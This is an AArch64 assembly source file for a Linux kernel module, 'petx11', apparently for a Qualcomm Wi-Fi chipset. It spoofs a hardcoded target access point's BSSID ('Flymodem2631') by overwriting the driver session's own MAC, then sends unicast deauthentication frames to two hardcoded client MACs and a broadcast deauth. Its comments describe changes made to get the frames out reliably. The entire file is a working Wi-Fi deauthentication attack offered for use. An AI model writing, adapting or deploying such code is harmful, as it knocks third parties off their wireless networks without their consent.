/*
 * petx11.S - Improved deauth with TX completion wait + unicast targets
 *
 * Changes from petx8:
 * 1. Adds msleep(100) after deauth to ensure OTA TX before session teardown
 * 2. Sends unicast deauths to known client MACs (more reliable than broadcast)
 * 3. Also sends broadcast deauth
 * 4. Uses pe_find_session_by_bssid with target BSSID
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0
    .quad 0
    .asciz "msleep"
    .balign 64, 0

.section .rodata, "a"
str_cds:          .asciz "cds_get_context"
str_pe_find_bss:  .asciz "pe_find_session_by_bssid"
str_lim_deauth:   .asciz "lim_send_deauth_mgmt_frame"

fmt_init:     .asciz "petx11: deauth with TX wait + unicast\n"
fmt_lookup:   .asciz "petx11: looking for bssid %02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_sess:     .asciz "petx11: session=%px\n"
fmt_nosess:   .asciz "petx11: NO session found\n"
fmt_selfmac:  .asciz "petx11: selfMac=%02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_deauth:   .asciz "petx11: deauth to %02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_wait:     .asciz "petx11: waiting 100ms for TX...\n"
fmt_restored: .asciz "petx11: restored, done\n"
fmt_err:      .asciz "petx11: ERROR\n"

/* Target BSSID - Flymodem2631 */
.balign 8
target_bssid:
    .byte 0x8c,0xf0,0xdf,0x1f,0x4f,0xc7
    .byte 0,0

/* Broadcast */
.balign 8
bcast_mac:
    .byte 0xff,0xff,0xff,0xff,0xff,0xff
    .byte 0,0

/* Known client 1: da:d3:a5:05:05:d7 */
.balign 8
client1_mac:
    .byte 0xda,0xd3,0xa5,0x05,0x05,0xd7
    .byte 0,0

/* Known client 2: 92:10:4b:35:70:e4 */
.balign 8
client2_mac:
    .byte 0x92,0x10,0x4b,0x35,0x70,0xe4
    .byte 0,0

.equ SELFMAC_OFF, 0xC6
.equ BSSID_OFF, 0xC0

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-112]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    stp x27, x28, [sp, #80]

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* Resolve symbols */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_pe_find_bss
    add x0, x0, :lo12:str_pe_find_bss
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x20, x0                /* x20 = pe_find_session_by_bssid */

    adrp x0, str_lim_deauth
    add x0, x0, :lo12:str_lim_deauth
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x21, x0                /* x21 = lim_send_deauth_mgmt_frame */

    /* Get mac_ctx */
    mov w0, #0x35
    blr x19
    cbz x0, .Lerr
    mov x22, x0                /* x22 = mac_ctx */

    /* Print target BSSID */
    adrp x8, target_bssid
    add x8, x8, :lo12:target_bssid
    adrp x0, fmt_lookup
    add x0, x0, :lo12:fmt_lookup
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    /* Find PE session */
    sub sp, sp, #16
    mov x0, x22
    adrp x1, target_bssid
    add x1, x1, :lo12:target_bssid
    mov x2, sp
    blr x20
    add sp, sp, #16
    cbz x0, .Lnosess
    mov x23, x0                /* x23 = session */

    adrp x0, fmt_sess
    add x0, x0, :lo12:fmt_sess
    mov x1, x23
    bl printk

    /* Save original selfMacAddr */
    add x8, x23, #SELFMAC_OFF
    ldr w24, [x8]
    ldrh w25, [x8, #4]

    /* Save original bssId */
    add x8, x23, #BSSID_OFF
    ldr w26, [x8]
    ldrh w27, [x8, #4]

    /* Print original selfMac */
    adrp x0, fmt_selfmac
    add x0, x0, :lo12:fmt_selfmac
    add x8, x23, #SELFMAC_OFF
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    /* ===== Spoof: copy bssId → selfMacAddr ===== */
    add x26, x23, #BSSID_OFF
    add x8, x23, #SELFMAC_OFF
    ldr w9, [x26]
    str w9, [x8]
    ldrh w9, [x26, #4]
    strh w9, [x8, #4]

    /* ===== Send unicast deauth to client 1 ===== */
    adrp x8, client1_mac
    add x8, x8, :lo12:client1_mac
    adrp x0, fmt_deauth
    add x0, x0, :lo12:fmt_deauth
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    mov x0, x22                /* mac_ctx */
    mov w1, #7                 /* reason: Class 3 */
    adrp x2, client1_mac
    add x2, x2, :lo12:client1_mac
    mov x3, x23                /* session */
    mov w4, #0                 /* waitForAck */
    blr x21                    /* lim_send_deauth_mgmt_frame */

    /* ===== Send unicast deauth to client 2 ===== */
    adrp x8, client2_mac
    add x8, x8, :lo12:client2_mac
    adrp x0, fmt_deauth
    add x0, x0, :lo12:fmt_deauth
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    mov x0, x22
    mov w1, #7
    adrp x2, client2_mac
    add x2, x2, :lo12:client2_mac
    mov x3, x23
    mov w4, #0
    blr x21

    /* ===== Send broadcast deauth ===== */
    adrp x8, bcast_mac
    add x8, x8, :lo12:bcast_mac
    adrp x0, fmt_deauth
    add x0, x0, :lo12:fmt_deauth
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    mov x0, x22
    mov w1, #7
    adrp x2, bcast_mac
    add x2, x2, :lo12:bcast_mac
    mov x3, x23
    mov w4, #0
    blr x21

    /* ===== Wait 100ms for TX to complete ===== */
    adrp x0, fmt_wait
    add x0, x0, :lo12:fmt_wait
    bl printk
    mov w0, #100
    bl msleep

    /* ===== Restore selfMacAddr ===== */
    add x8, x23, #SELFMAC_OFF
    str w24, [x8]
    strh w25, [x8, #4]

    adrp x0, fmt_restored
    add x0, x0, :lo12:fmt_restored
    bl printk
    b .Ldone

.Lnosess:
    adrp x0, fmt_nosess
    add x0, x0, :lo12:fmt_nosess
    bl printk
    b .Ldone

.Lerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    bl printk

.Ldone:
    mov w0, #-1
    ldp x27, x28, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #112
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .plt, "ax"
    nop; nop
.section .init.plt, "ax"
    nop; nop
.section .text.ftrace_trampoline, "ax"
    nop; nop
